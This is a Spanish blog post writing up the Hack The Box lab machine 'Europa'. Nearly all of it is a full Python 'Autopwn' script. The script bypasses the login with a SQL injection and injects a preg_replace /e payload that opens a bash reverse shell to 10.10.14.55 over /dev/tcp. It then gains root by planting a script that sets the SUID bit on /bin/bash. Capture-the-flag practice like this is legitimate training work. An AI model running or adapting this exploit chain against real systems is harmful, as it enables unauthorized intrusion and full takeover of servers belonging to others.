---
layout: single
title: Europa - Hack The Box
excerpt: "Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn."
date: 2020-01-31
classes: wide
header:
  teaser: /assets/images/htb-writeup-europa/europa_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Autopwn
  - Scripting
tags:
  - Sqli
  - Web Exploiting
  - Privilege Escalation
  - Python
  - Pentesting
---

<p align="center">
<img src="/assets/images/htb-writeup-europa/europa_logo.png">
</p>

Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.

Para los interesados en la resolución de esta máquina, os dejo el enlace al vídeo que subí a mi canal:

- [Máquina Europa - HackTheBox](https://www.youtube.com/watch?v=wOm4OOBLbys)

## Script Autopwn

```python
#!/usr/bin/python
#coding: utf-8

# Author: s4vitar https://www.youtube.com/watch?v=wOm4OOBLbys

import requests, sys, urllib3, signal, time, threading
from pwn import *

# Declaración de variables
url = "https://admin-portal.europacorp.htb/login.php"
url_openvpn = "https://admin-portal.europacorp.htb/tools.php"
lport = 443

signal.signal(signal.SIGINT, signal.SIG_DFL)

def obtainShell():

 s = None

 try:
  urllib3.disable_warnings()
  s = requests.session()
  s.verify = False
  s.keep_alive = False

  login_data = {
   'email' : "admin@europacorp.htb' OR '1' = '1",
   'password' : 'admin'
  }

  p1 = log.progress("Login")
  p1.status('Realizando inyección SQL')
  time.sleep(2)

  r = s.post(url, data=login_data)

  p1.status('Inyección SQL enviada')
  time.sleep(2)

  if "Dashboard" in r.text:
   p1.success("Inyección SQL realizada con éxito")
   time.sleep(1)
   log.success("Acceso al Dashboard garantizado")
   time.sleep(1)
  else:
   p1.failure("No ha sido posible realizar la inyección SQL")
   sys.exit()

  p2 = log.progress("Explotación")
  p2.status("Creando un nuevo fichero de configuración VPN")
  time.sleep(2)

  openvpn_config_file_data = {
   'pattern' : '/ip_address/e',
   'ipaddress' : """system("bash -c 'bash -i > /dev/tcp/10.10.14.55/443 0>&1'")""",
   'text' : 'ip_address = s4vitar'
  }

  p2.status("Enviando petición al servidor")
  time.sleep(2)

  r = s.post(url_openvpn, data=openvpn_config_file_data, timeout=1)

  p2.success("Petición enviada con éxito")
  time.sleep(1)

 except requests.exceptions.ReadTimeout:
  p2.success("Petición enviada con éxito")
  time.sleep(1)

 except:
  print "\n[*] Ha ocurrido un error...\n"
  sys.exit()

if __name__ == '__main__':

 try:
  threading.Thread(target=obtainShell).start()
 except Exception as e:
  log.error(str(e))

 shell = listen(lport, timeout=20).wait_for_connection()

 if shell.sock is None:
  log.failure("No se ha obtenido ninguna conexión")
  sys.exit()
 else:
  log.success("Se ha obtenido una conexión")
  time.sleep(1)
  log.info("Acceso al sistema como usuario www-data")
  time.sleep(1)

 p3 = log.progress("Escalación de privilegios")
 p3.status("Creando fichero logcleared.sh en el sistema")
 time.sleep(2)
 shell.sendline("echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /var/www/cmd/logcleared.sh; chmod +x /var/www/cmd/logcleared.sh")
 p3.status("Archivo logcleared.sh creado")
 time.sleep(120)
 p3.status("Obteniendo shell como root")
 shell.sendline("bash -p")
 p3.success("Pwned!!")
 shell.interactive()

 sys.exit()
```